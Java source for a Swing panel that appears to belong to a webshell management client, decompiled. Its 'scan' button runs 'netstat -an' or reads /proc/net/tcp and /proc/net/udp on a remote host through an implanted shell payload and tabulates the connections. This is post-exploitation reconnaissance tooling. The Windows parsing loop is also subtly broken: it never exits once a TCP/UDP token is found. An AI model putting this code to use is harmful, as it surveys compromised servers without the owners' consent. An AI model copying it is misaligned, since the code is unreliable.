package core.ui.component;

import core.Encoding;
import core.imp.Payload;
import core.shell.ShellEntity;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.Vector;
import java.util.concurrent.CopyOnWriteArrayList;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.automaticBindClick;
import util.functions;

public class ShellNetstat extends JPanel {
    private static final Vector COLUMNS_VECTOR = new Vector(new CopyOnWriteArrayList(new String[]{"Proto", "Local Address", "Remote Address", "State"}));
    private static final HashMap<String, String> LINUX_INET_FILE_MAPPING = new HashMap<>();
    private static final HashMap<String, String> LINUX_TCP_STATUS_MAPPING = new HashMap<>();
    private final DataView dataView = new DataView(null, COLUMNS_VECTOR, -1, -1);
    private Encoding encoding;
    private final JButton getButton = new JButton("scan");
    private final Payload payload;
    private final JSplitPane portScanSplitPane = new JSplitPane();
    private final ShellEntity shellEntity;

    static {
        LINUX_INET_FILE_MAPPING.put("tcp4", "/proc/net/tcp");
        LINUX_INET_FILE_MAPPING.put("udp4", "/proc/net/udp");
        LINUX_TCP_STATUS_MAPPING.put("01", "ESTABLISHED");
        LINUX_TCP_STATUS_MAPPING.put("02", "SYN_SENT");
        LINUX_TCP_STATUS_MAPPING.put("03", "SYN_RECV");
        LINUX_TCP_STATUS_MAPPING.put("04", "FIN_WAIT1");
        LINUX_TCP_STATUS_MAPPING.put("05", "FIN_WAIT2");
        LINUX_TCP_STATUS_MAPPING.put("06", "TIME_WAIT");
        LINUX_TCP_STATUS_MAPPING.put("07", "CLOSE");
        LINUX_TCP_STATUS_MAPPING.put("08", "CLOSE_WAIT");
        LINUX_TCP_STATUS_MAPPING.put("09", "LAST_ACK");
        LINUX_TCP_STATUS_MAPPING.put("0A", "LISTEN");
        LINUX_TCP_STATUS_MAPPING.put("0B", "CLOSING");
    }

    public ShellNetstat(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = shellEntity2.getPayloadModel();
        this.portScanSplitPane.setOrientation(0);
        this.portScanSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.getButton);
        this.portScanSplitPane.setTopComponent(topPanel);
        this.portScanSplitPane.setBottomComponent(new JScrollPane(this.dataView));
        setLayout(new BorderLayout());
        add(this.portScanSplitPane);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void getButtonClick(ActionEvent actionEvent) {
        Vector rowsVector;
        try {
            if (isLinux()) {
                rowsVector = getLinuxNet();
            } else {
                rowsVector = getWinNet();
            }
            this.dataView.AddRows(rowsVector);
        } catch (Exception e) {
            Log.error(e);
        }
    }

    private boolean isLinux() {
        return this.payload.currentDir().charAt(0) == '/';
    }

    private Vector<Vector<String>> getLinuxNet() {
        Vector<Vector<String>> rows = new Vector<>();
        String[] strArr = (String[]) LINUX_INET_FILE_MAPPING.keySet().toArray(new String[0]);
        for (String protoType : strArr) {
            String resultString = new String(this.payload.downloadFile(LINUX_INET_FILE_MAPPING.get(protoType)));
            String[] lines = resultString.split("\n");
            Log.log(resultString, new Object[0]);
            for (String line : lines) {
                try {
                    if (line.indexOf("local_address") == -1) {
                        String[] infos = line.trim().split("\\s+");
                        if (infos.length > 10) {
                            Vector<String> oneRow = new Vector<>();
                            oneRow.add(protoType);
                            oneRow.add(Inet4Addr(infos[1]));
                            oneRow.add(Inet4Addr(infos[2]));
                            oneRow.add(LINUX_TCP_STATUS_MAPPING.get(infos[3]));
                            rows.add(oneRow);
                        }
                    }
                } catch (Exception e) {
                    Log.error(line);
                    Log.error(e);
                }
            }
        }
        return rows;
    }

    private Vector<Vector<String>> getWinNet() {
        Vector<Vector<String>> rows = new Vector<>();
        String[] lines = this.payload.execCommand("netstat -an").replace("\r", "").split("\n");
        for (String line : lines) {
            if (line.indexOf("TCP") != -1 || line.indexOf("UDP") != -1) {
                String[] infos = line.split("\\s+");
                Vector<String> oneRow = new Vector<>();
                int pt = -1;
                int i = 0;
                while (true) {
                    if (i >= infos.length) {
                        break;
                    } else if (infos[i].indexOf("TCP") == -1 && infos[i].indexOf("UDP") == -1) {
                        i++;
                    } else {
                        pt = i;
                    }
                }
                pt = i;
                if (pt != -1) {
                    oneRow.addAll(new CopyOnWriteArrayList(Arrays.copyOfRange(infos, pt, infos.length)));
                }
                rows.add(oneRow);
            }
        }
        return rows;
    }

    private String Inet4Addr(String hex) {
        String[] strings = hex.split(":");
        String ip = linuxHexToIP(strings[0]);
        return ip + ":" + functions.byteToInt2(functions.hexToByte(strings[1]));
    }

    public static String linuxHexToIP(String hexString) {
        ArrayList<String> arrayList = new ArrayList<>();
        for (byte b : functions.hexToByte(hexString)) {
            arrayList.add(Integer.toString(b & 255));
        }
        Collections.reverse(arrayList);
        return Arrays.toString(arrayList.toArray()).replace(" ", "").replace("[", "").replace("]", "").replace(",", ".").trim();
    }
}
